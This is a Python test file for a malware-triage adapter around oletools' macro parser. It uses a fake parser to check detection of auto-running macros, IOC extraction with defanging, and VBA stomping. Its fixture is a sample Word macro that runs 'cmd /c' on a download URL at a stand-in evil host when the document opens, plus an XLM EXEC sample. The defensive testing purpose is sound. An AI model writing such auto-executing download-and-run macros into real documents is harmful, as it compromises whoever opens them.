"""Tests for the macro adapter using a fake VBA_Parser (oletools' public surface)."""
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from app.adapters import macro_adapter as ma  # noqa: E402
from app.core.models import Severity  # noqa: E402

CODE = 'Sub AutoOpen()\n  x = "http://evil.example.com/a.exe"\n  Shell "cmd /c " & x\nEnd Sub'


class FakeParser:
    stomp = False
    xlm = False

    def __init__(self, path):
        self.type = "OpenXML"
        self.closed = False

    def detect_vba_macros(self):
        return True

    def detect_xlm_macros(self):
        return self.xlm

    def extract_macros(self):
        yield ("f.docm", "word/vbaProject.bin", "VBA/ThisDocument", CODE)
        if self.xlm:
            yield ("f.xls", "xlm_macro", "xlm_macro.txt", '" EMULATION - ...\nEXEC("calc")')

    def analyze_macros(self, show_decoded_strings=False, deobfuscate=False):
        return [("Suspicious", "Shell", "May run an executable file or a system command"),
                ("IOC", "http://evil.example.com/a.exe", "URL"),
                ("AutoExec", "AutoOpen", "Runs when the Word document is opened"),
                ("IOC", "http://evil.example.com/a.exe", "URL"),
                ("Base64 String", "aGVsbG8=", "hello")]

    def reveal(self):
        return CODE.replace("x", "\"http://evil.example.com/a.exe\"")

    def detect_vba_stomping(self):
        return self.stomp

    def extract_pcode(self):
        return "Line #0:\n\tFuncDefn (AutoOpen)"

    def close(self):
        self.closed = True


class NoMacros(FakeParser):
    def detect_vba_macros(self):
        return False


class Exploding(FakeParser):
    def analyze_macros(self, **kw):
        raise RuntimeError("boom")

    def extract_pcode(self):
        raise RuntimeError("no pcodedmp")


class MacroAdapterTests(unittest.TestCase):
    def test_full_run(self):
        res = ma.analyse("s.docm", ma.MacroOptions(), parser_cls=FakeParser)
        self.assertTrue(res.ok, res.error)
        d = res.data
        self.assertEqual(len(d.modules), 1)
        self.assertEqual(d.analysis[0].kind, "AutoExec")        # sorted by type order
        self.assertEqual(d.iocs, ["http://evil.example.com/a.exe"])  # de-duplicated
        self.assertIn("evil", d.revealed)
        self.assertIn("FuncDefn", d.pcode)
        self.assertFalse(d.stomping)
        titles = [f.title for f in res.findings]
        self.assertIn("AutoExec: AutoOpen", titles)
        self.assertIn("IOC: hxxp://evil[.]example[.]com/a.exe", titles)
        self.assertTrue(res.command.startswith("olevba --decode --reveal --show-pcode "))
        self.assertIn("hxxp://", res.raw_output)   # raw output is defanged in the table

    def test_stomping_and_xlm(self):
        class P(FakeParser):
            stomp = True
            xlm = True
        d = ma.analyse("s.xls", ma.MacroOptions(), parser_cls=P).data
        self.assertTrue(d.stomping)
        self.assertTrue(d.has_xlm)
        self.assertTrue(any(m.is_xlm for m in d.modules))
        res = ma.analyse("s.xls", ma.MacroOptions(), parser_cls=P)
        self.assertTrue(any(f.title == "VBA stomping detected" and f.severity == Severity.HIGH
                            for f in res.findings))

    def test_no_macros(self):
        res = ma.analyse("s.docx", ma.MacroOptions(), parser_cls=NoMacros)
        self.assertTrue(res.ok)
        self.assertEqual(res.data.modules, [])
        self.assertEqual(res.findings, [])

    def test_partial_failures_degrade(self):
        res = ma.analyse("s.docm", ma.MacroOptions(), parser_cls=Exploding)
        self.assertTrue(res.ok)
        self.assertEqual(len(res.data.modules), 1)
        self.assertIn("Keyword analysis: boom", res.error)
        self.assertIn("P-code", res.error)

    def test_options(self):
        o = ma.MacroOptions(decode=False, deobfuscate=True, reveal=False, pcode=False)
        self.assertEqual(o.cli_args(), ["--deobf"])

    def test_decrypt_requires_encrypted(self):
        if not ma.msoffcrypto_available():
            self.skipTest("msoffcrypto-tool not installed")


if __name__ == "__main__":
    unittest.main()
